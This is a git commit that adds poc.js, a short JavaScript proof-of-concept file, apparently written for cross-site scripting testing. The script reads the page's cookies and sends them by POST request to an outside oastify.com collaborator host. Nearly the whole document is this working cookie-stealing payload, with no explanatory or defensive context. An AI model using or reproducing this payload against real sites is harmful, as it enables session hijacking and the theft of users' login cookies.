b19d18339c1012ad07f7d63186ec0f839a450d69
Jay3shh <jayesh921@gmail.com>
2023-06-24 22:11:51 +0530

    Create poc.js

---
+++ poc.js
@@ -0,0 +1,18 @@
+var victimCookies=document.cookie
+var xhr = new XMLHttpRequest();
+xhr.open("POST", "https://fcvrfsv5vh9rvkkuhmr3cfqpigo7cx0m.oastify.com", true);
+xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+
+xhr.onreadystatechange = function() {
+  if (xhr.readyState === 4 && xhr.status === 200) {
+    var response = xhr.responseText;
+    console.log(response);
+    // Process the response data here
+  } else if (xhr.readyState === 4) {
+    console.log('Request failed with status code:', xhr.status);
+    // Handle any errors that occur during the request
+  }
+};
+
+var requestBody = "cookies=" + victimCookies;
+xhr.send(requestBody);
